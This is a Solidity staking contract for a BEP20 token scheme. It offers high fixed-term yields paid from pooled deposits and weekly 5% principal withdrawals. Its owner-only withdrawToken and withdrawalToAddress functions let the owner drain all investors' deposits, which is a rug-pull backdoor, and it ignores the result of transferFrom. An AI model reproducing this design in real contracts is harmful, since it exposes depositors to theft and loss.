/**
 *Submitted for verification at BscScan.com on 2022-02-28
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.10;

interface BEP20{
    function totalSupply() external view returns (uint theTotalSupply);
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint _value) external returns (bool success);
    function approve(address _spender, uint _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}


contract TeamRijent{
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
    bool reinvest;
    uint withdrawnPrincipal;
    uint principalWithdrawnAt;
    uint nextPrincipalWithdrawalAt;
  }
  
  struct Investor {
    bool registered;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
    uint reinvest;
  }
  
    
  uint MIN_DEPOSIT = 100 * (10**9) ;
  uint MIN_WITHDRAWAL = 100 * (10**9) ;
  address public contractAddr = address(this);
  address public owner = msg.sender;
  address public token;
  bool public depositStatus;
  
  Tariff[] public tariffs;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalWithdrawal;
  uint public totalReinvest;
  uint public principalWithdrawalInterval = 7 days;
  
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event ReDepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  event OwnershipTransferred(address);
  event WithdrawPrincipal(address user, uint amount, uint withdrawnAt, uint plan);
  

 
  
  constructor() {
    tariffs.push(Tariff(360 days, 12*3));
    tariffs.push(Tariff(720 days, 24*5));
    tariffs.push(Tariff(1440 days, 48*6));

    token = 0x913aFbBA462d6ae230344209d0Bd11CE3CE92Ed1; // RTC Token

    owner = msg.sender;
    depositStatus = true;
  }

  function transferOwnership(address to) external {
      require(msg.sender == owner, "Only owner");
      require(to != address(0), "Cannot transfer ownership to zero address");
      owner = to;
      emit OwnershipTransferred(to);
  }

  function changeDepositStatus(bool _depositStatus) external {
      require (msg.sender==owner," Only Owner");
      depositStatus = _depositStatus;
  }
  
  function deposit(uint tariff, uint amount) external {
        require(amount >= MIN_DEPOSIT);
        require(tariff < tariffs.length);
        uint currentTime = block.timestamp;
        if (!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            totalInvestors++;
        }

        investors[msg.sender].invested += amount;
        totalInvested += amount;

        //Tariff storage tariffObj = tariffs[tariff];
        uint nextPrincipalWithdrawalDate = principalWithdrawalInterval + currentTime;
        investors[msg.sender].deposits.push(Deposit(tariff, amount, currentTime,false,0,currentTime,nextPrincipalWithdrawalDate));
        BEP20 _token = BEP20(token);
        require(_token.balanceOf(msg.sender) >= amount, "Insufficient balance of user");
        _token.transferFrom(msg.sender, contractAddr, amount );

        emit DepositAt(msg.sender, tariff, amount);
	}

   function reDeposit(uint tariff) external {
        uint amount = withdrawableMint(msg.sender);

        require(amount >= MIN_DEPOSIT);
        require(tariff == 1 || tariff == 2,"Re Deposit allowed only in Plan 2 and Plan 3");
        uint currentTime = block.timestamp;
        if (!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            totalInvestors++;
        }
        investors[msg.sender].reinvest += amount;
        investors[msg.sender].paidAt = currentTime;
        totalReinvest+=amount;

        investors[msg.sender].invested += amount;
        totalInvested += amount;

        //Tariff storage tariffObj = tariffs[tariff];
        uint nextPrincipalWithdrawalDate = principalWithdrawalInterval + currentTime;
        investors[msg.sender].deposits.push(Deposit(tariff, amount, currentTime,true,0,currentTime,nextPrincipalWithdrawalDate));
        
        emit ReDepositAt(msg.sender, tariff, amount);
	} 
  
  
  function withdrawPrincipal(uint index) external {
    Investor storage investor = investors[msg.sender];
    Deposit storage dep = investor.deposits[index];
    require(investor.registered==true,"Invalid User");
    require(dep.nextPrincipalWithdrawalAt <= block.timestamp , "Withdrawn Time not reached");
    
    require(dep.withdrawnPrincipal < dep.amount, "No Principal Found");
    uint currentTime = block.timestamp;
    
    uint withdrawnAmt = dep.amount*5/100;
    
    BEP20 _token = BEP20(token);
    require(_token.balanceOf(contractAddr) >= withdrawnAmt, "Insufficient Contract Balance");
    _token.transfer(msg.sender, withdrawnAmt);

    dep.withdrawnPrincipal += withdrawnAmt;
    dep.principalWithdrawnAt = currentTime;
    //dep.nextPrincipalWithdrawalAt =  currentTime + 7 days;
    dep.nextPrincipalWithdrawalAt =  currentTime + principalWithdrawalInterval;

    emit WithdrawPrincipal(msg.sender, withdrawnAmt, currentTime, index);
  }

  function withdrawMint() external {
    require(investors[msg.sender].registered==true,"Invalid User");
    uint amount = withdrawableMint(msg.sender);
    require(amount>=MIN_WITHDRAWAL,"Minimum Withdraw Limit Exceed");
    BEP20 _token = BEP20(token);
    require(_token.balanceOf(contractAddr) >= amount, "Insufficient Contract Balance");
    if (_token.transfer(msg.sender, amount)) {
      investors[msg.sender].withdrawn += amount;
      investors[msg.sender].paidAt = block.timestamp;
      totalWithdrawal +=amount;

      emit Withdraw(msg.sender, amount);
    }
  }


  
  
 
  function withdrawalToAddress(address payable to, uint amount) external {
        require(msg.sender == owner);
        to.transfer(amount);
  }

  // Only owner can withdraw token 
    function withdrawToken(address tokenAddress, address to, uint amount) external {
        require(msg.sender == owner, "Only owner");
        BEP20 tokenNew = BEP20(tokenAddress);
        tokenNew.transfer(to, amount);
       
    }
  
  function withdrawableMint(address user) public view returns (uint amount) {
    Investor storage investor = investors[user];
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.timestamp > finish ? finish : block.timestamp;

      if (since < till) {
        amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
      }
    }
  }


    /// Show Package Details
    function packageDetails(address addr) public view returns(
                    bool isRegsitered,
                    uint[] memory packageAmt, 
                    uint[] memory planType, 
                    uint[] memory purchaseAt, 
                    uint[] memory withdrawnPrincipalAmt, 
                    uint[] memory withdrawnPrincipalAt, 
                    uint[] memory nextWithdrawnPrincipalAt,
                    bool[] memory withdrawBtn,
                    bool[] memory reinvestStatus
                    ){
        Investor storage investor = investors[addr];
    
   
        uint len = investor.deposits.length;
        packageAmt                     = new uint[](len);
        planType                       = new uint[](len);
        purchaseAt                     = new uint[](len);
        withdrawnPrincipalAmt          = new uint[](len);
        withdrawnPrincipalAt           = new uint[](len);
        nextWithdrawnPrincipalAt       = new uint[](len);
        withdrawBtn                    = new bool[](len);
        reinvestStatus                 = new bool[](len);
        for (uint i = 0; i < investor.deposits.length; i++) {
            Deposit storage dep = investor.deposits[i];
           
            packageAmt[i]  = dep.amount;
            planType[i] = dep.tariff; 
            purchaseAt[i]  = dep.at; 
            reinvestStatus[i] = dep.reinvest; 
            withdrawnPrincipalAmt[i]  = dep.withdrawnPrincipal; 
            withdrawnPrincipalAt[i]  = dep.principalWithdrawnAt; 
            nextWithdrawnPrincipalAt[i]  = dep.nextPrincipalWithdrawalAt; 
            withdrawBtn[i] = (dep.nextPrincipalWithdrawalAt < block.timestamp && dep.amount > dep.withdrawnPrincipal) ? true : false;
        }
        return (investor.registered,packageAmt, planType,purchaseAt,withdrawnPrincipalAmt,withdrawnPrincipalAt,nextWithdrawnPrincipalAt,withdrawBtn,reinvestStatus);
    }

}